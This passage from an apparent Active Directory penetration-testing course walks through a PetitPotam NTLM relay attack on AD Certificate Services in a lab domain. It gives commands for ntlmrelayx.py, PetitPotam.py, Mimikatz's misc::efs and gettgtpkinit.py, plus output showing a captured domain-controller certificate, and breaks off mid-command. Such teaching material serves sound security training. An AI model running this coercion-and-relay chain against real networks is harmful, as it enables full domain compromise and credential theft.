<a id=__codelineno-13-32 name=__codelineno-13-32 href=#__codelineno-13-32></a>[*] Setting up WCF Server
<a id=__codelineno-13-33 name=__codelineno-13-33 href=#__codelineno-13-33></a>
<a id=__codelineno-13-34 name=__codelineno-13-34 href=#__codelineno-13-34></a>[*] Servers started, waiting for connections
</code></pre></div> <p>In another window, we can run the tool <a href=https://github.com/topotam/PetitPotam target=_blank rel="noopener nofollow">PetitPotam.py</a>. We run this tool with the command <code>python3 PetitPotam.py &lt;attack host IP&gt; &lt;Domain Controller IP&gt;</code> to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.</p> <p>There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: <code>misc::efs /server:&lt;Domain Controller&gt; /connect:&lt;ATTACK HOST&gt;</code>. There is also a PowerShell implementation of the tool <a href=https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1 target=_blank rel="noopener nofollow">Invoke-PetitPotam.ps1</a>.</p> <p>Here we run the tool and attempt to coerce authentication via the <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8 target=_blank rel="noopener nofollow">EfsRpcOpenFileRaw</a> method.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a>secops@kali[/kali]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
<a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a>
<a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a>              ___            _        _      _        ___            _                     
<a id=__codelineno-14-4 name=__codelineno-14-4 href=#__codelineno-14-4></a>             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
<a id=__codelineno-14-5 name=__codelineno-14-5 href=#__codelineno-14-5></a>             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | &#39;  \  
<a id=__codelineno-14-6 name=__codelineno-14-6 href=#__codelineno-14-6></a>            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
<a id=__codelineno-14-7 name=__codelineno-14-7 href=#__codelineno-14-7></a>          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| 
<a id=__codelineno-14-8 name=__codelineno-14-8 href=#__codelineno-14-8></a>          &quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39;&quot;`-0-0-&#39; 
<a id=__codelineno-14-9 name=__codelineno-14-9 href=#__codelineno-14-9></a>
<a id=__codelineno-14-10 name=__codelineno-14-10 href=#__codelineno-14-10></a>              PoC to elicit machine account authentication via some MS-EFSRPC functions
<a id=__codelineno-14-11 name=__codelineno-14-11 href=#__codelineno-14-11></a>                                      by topotam (@topotam77)
<a id=__codelineno-14-12 name=__codelineno-14-12 href=#__codelineno-14-12></a>
<a id=__codelineno-14-13 name=__codelineno-14-13 href=#__codelineno-14-13></a>                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN
<a id=__codelineno-14-14 name=__codelineno-14-14 href=#__codelineno-14-14></a>
<a id=__codelineno-14-15 name=__codelineno-14-15 href=#__codelineno-14-15></a>Trying pipe lsarpc
<a id=__codelineno-14-16 name=__codelineno-14-16 href=#__codelineno-14-16></a>[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
<a id=__codelineno-14-17 name=__codelineno-14-17 href=#__codelineno-14-17></a>[+] Connected!
<a id=__codelineno-14-18 name=__codelineno-14-18 href=#__codelineno-14-18></a>[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
<a id=__codelineno-14-19 name=__codelineno-14-19 href=#__codelineno-14-19></a>[+] Successfully bound!
<a id=__codelineno-14-20 name=__codelineno-14-20 href=#__codelineno-14-20></a>[-] Sending EfsRpcOpenFileRaw!
<a id=__codelineno-14-21 name=__codelineno-14-21 href=#__codelineno-14-21></a>
<a id=__codelineno-14-22 name=__codelineno-14-22 href=#__codelineno-14-22></a>[+] Got expected ERROR_BAD_NETPATH exception!!
<a id=__codelineno-14-23 name=__codelineno-14-23 href=#__codelineno-14-23></a>[+] Attack worked!
</code></pre></div> <p>Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful. <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a>secops@kali[/kali]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.legalcorp.local/certsrv/certfnsh.asp --adcs --template DomainController
<a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a>
<a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
<a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a>
<a id=__codelineno-15-5 name=__codelineno-15-5 href=#__codelineno-15-5></a>[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
<a id=__codelineno-15-6 name=__codelineno-15-6 href=#__codelineno-15-6></a>[*] Protocol Client DCSYNC loaded..
<a id=__codelineno-15-7 name=__codelineno-15-7 href=#__codelineno-15-7></a>[*] Protocol Client HTTPS loaded..
<a id=__codelineno-15-8 name=__codelineno-15-8 href=#__codelineno-15-8></a>[*] Protocol Client HTTP loaded..
<a id=__codelineno-15-9 name=__codelineno-15-9 href=#__codelineno-15-9></a>[*] Protocol Client IMAP loaded..
<a id=__codelineno-15-10 name=__codelineno-15-10 href=#__codelineno-15-10></a>[*] Protocol Client IMAPS loaded..
<a id=__codelineno-15-11 name=__codelineno-15-11 href=#__codelineno-15-11></a>[*] Protocol Client LDAPS loaded..
<a id=__codelineno-15-12 name=__codelineno-15-12 href=#__codelineno-15-12></a>[*] Protocol Client LDAP loaded..
<a id=__codelineno-15-13 name=__codelineno-15-13 href=#__codelineno-15-13></a>[*] Protocol Client MSSQL loaded..
<a id=__codelineno-15-14 name=__codelineno-15-14 href=#__codelineno-15-14></a>[*] Protocol Client RPC loaded..
<a id=__codelineno-15-15 name=__codelineno-15-15 href=#__codelineno-15-15></a>[*] Protocol Client SMB loaded..
<a id=__codelineno-15-16 name=__codelineno-15-16 href=#__codelineno-15-16></a>[*] Protocol Client SMTP loaded..
<a id=__codelineno-15-17 name=__codelineno-15-17 href=#__codelineno-15-17></a>[+] Protocol Attack DCSYNC loaded..
<a id=__codelineno-15-18 name=__codelineno-15-18 href=#__codelineno-15-18></a>[+] Protocol Attack HTTP loaded..
<a id=__codelineno-15-19 name=__codelineno-15-19 href=#__codelineno-15-19></a>[+] Protocol Attack HTTPS loaded..
<a id=__codelineno-15-20 name=__codelineno-15-20 href=#__codelineno-15-20></a>[+] Protocol Attack IMAP loaded..
<a id=__codelineno-15-21 name=__codelineno-15-21 href=#__codelineno-15-21></a>[+] Protocol Attack IMAPS loaded..
<a id=__codelineno-15-22 name=__codelineno-15-22 href=#__codelineno-15-22></a>[+] Protocol Attack LDAP loaded..
<a id=__codelineno-15-23 name=__codelineno-15-23 href=#__codelineno-15-23></a>[+] Protocol Attack LDAPS loaded..
<a id=__codelineno-15-24 name=__codelineno-15-24 href=#__codelineno-15-24></a>[+] Protocol Attack MSSQL loaded..
<a id=__codelineno-15-25 name=__codelineno-15-25 href=#__codelineno-15-25></a>[+] Protocol Attack RPC loaded..
<a id=__codelineno-15-26 name=__codelineno-15-26 href=#__codelineno-15-26></a>[+] Protocol Attack SMB loaded..
<a id=__codelineno-15-27 name=__codelineno-15-27 href=#__codelineno-15-27></a>[*] Running in relay mode to single host
<a id=__codelineno-15-28 name=__codelineno-15-28 href=#__codelineno-15-28></a>[*] Setting up SMB Server
<a id=__codelineno-15-29 name=__codelineno-15-29 href=#__codelineno-15-29></a>[*] Setting up HTTP Server
<a id=__codelineno-15-30 name=__codelineno-15-30 href=#__codelineno-15-30></a>[*] Setting up WCF Server
<a id=__codelineno-15-31 name=__codelineno-15-31 href=#__codelineno-15-31></a>
<a id=__codelineno-15-32 name=__codelineno-15-32 href=#__codelineno-15-32></a>[*] Servers started, waiting for connections
<a id=__codelineno-15-33 name=__codelineno-15-33 href=#__codelineno-15-33></a>[*] SMBD-Thread-4: Connection from LEGALCORP/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.legalcorp.local
<a id=__codelineno-15-34 name=__codelineno-15-34 href=#__codelineno-15-34></a>[*] HTTP server returned error code 200, treating as a successful login
<a id=__codelineno-15-35 name=__codelineno-15-35 href=#__codelineno-15-35></a>[*] Authenticating against http://ACADEMY-EA-CA01.legalcorp.local as LEGALCORP/ACADEMY-EA-DC01$ SUCCEED
<a id=__codelineno-15-36 name=__codelineno-15-36 href=#__codelineno-15-36></a>[*] SMBD-Thread-4: Connection from LEGALCORP/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.legalcorp.local
<a id=__codelineno-15-37 name=__codelineno-15-37 href=#__codelineno-15-37></a>[*] HTTP server returned error code 200, treating as a successful login
<a id=__codelineno-15-38 name=__codelineno-15-38 href=#__codelineno-15-38></a>[*] Authenticating against http://ACADEMY-EA-CA01.legalcorp.local as LEGALCORP/ACADEMY-EA-DC01$ SUCCEED
<a id=__codelineno-15-39 name=__codelineno-15-39 href=#__codelineno-15-39></a>[*] Generating CSR...
<a id=__codelineno-15-40 name=__codelineno-15-40 href=#__codelineno-15-40></a>[*] CSR generated!
<a id=__codelineno-15-41 name=__codelineno-15-41 href=#__codelineno-15-41></a>[*] Getting certificate...
<a id=__codelineno-15-42 name=__codelineno-15-42 href=#__codelineno-15-42></a>[*] GOT CERTIFICATE!
<a id=__codelineno-15-43 name=__codelineno-15-43 href=#__codelineno-15-43></a>[*] Base64 certificate of user ACADEMY-EA-DC01$: 
<a id=__codelineno-15-44 name=__codelineno-15-44 href=#__codelineno-15-44></a>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
<a id=__codelineno-15-45 name=__codelineno-15-45 href=#__codelineno-15-45></a>[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
<a id=__codelineno-15-46 name=__codelineno-15-46 href=#__codelineno-15-46></a>
<a id=__codelineno-15-47 name=__codelineno-15-47 href=#__codelineno-15-47></a>&lt;SNIP&gt;
</code></pre></div></p> <p>Next, we can take this base64 certificate and use <code>gettgtpkinit.py</code> to request a Ticket-Granting-Ticket (TGT) for the domain controller.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a>secops@kali[/kali]$ python3 /opt/PKINITtools/gettgtpkinit.py legalcorp.local/ACADEMY-EA-DC01\$ -pfx-base64 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